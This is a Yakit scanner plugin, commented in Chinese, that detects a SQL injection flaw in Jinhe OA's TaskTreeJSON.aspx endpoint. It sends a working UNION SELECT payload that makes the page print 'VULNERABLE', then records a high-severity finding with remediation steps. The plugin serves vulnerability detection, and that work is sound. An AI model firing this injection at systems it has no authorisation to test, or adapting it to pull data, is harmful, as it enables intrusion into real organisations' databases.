# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    # 固定请求包（控制输出为固定字符串 "VULNERABLE"）
    payload = `GET /C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/?id=1%27+union+all+select+null%2C%27VULNERABLE%27%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--+ HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

`

    rsp, req, _ = poc.HTTP(
        payload,
        poc.params({"target": addr}),
        poc.https(isTls),
        poc.redirectTimes(0),
    )
    
    # 匹配固定输出 "VULNERABLE"
    if poc.GetStatusCodeFromResponse(rsp) == 200 {
        if str.MatchAllOfSubString(rsp, `"VULNERABLE"`) {  # 匹配固定输出
            
            yakit.Info("%v 存在金和OA SQL注入漏洞", addr)
            risk.NewRisk(
                addr,
                risk.title("金和OA SQL注入漏洞"),
                risk.severity("high"),
                risk.description("金和OA系统的 `/C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx` 接口存在SQL注入漏洞，攻击者可利用此漏洞控制页面输出。"),  
                risk.solution("1. 升级金和OA系统\n2. 对输入参数进行严格过滤\n3. 禁用动态SQL拼接"),
                risk.request(string(req)),
                risk.response(string(rsp)[:512]),  # 截断响应
                risk.cve(""),  # 若无CVE可留空
            )
        }
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    result.IsOpen() && len(result.Fingerprint.HttpFlows) > 0 && 
        handleCheck(result.Target, result.Port)
}
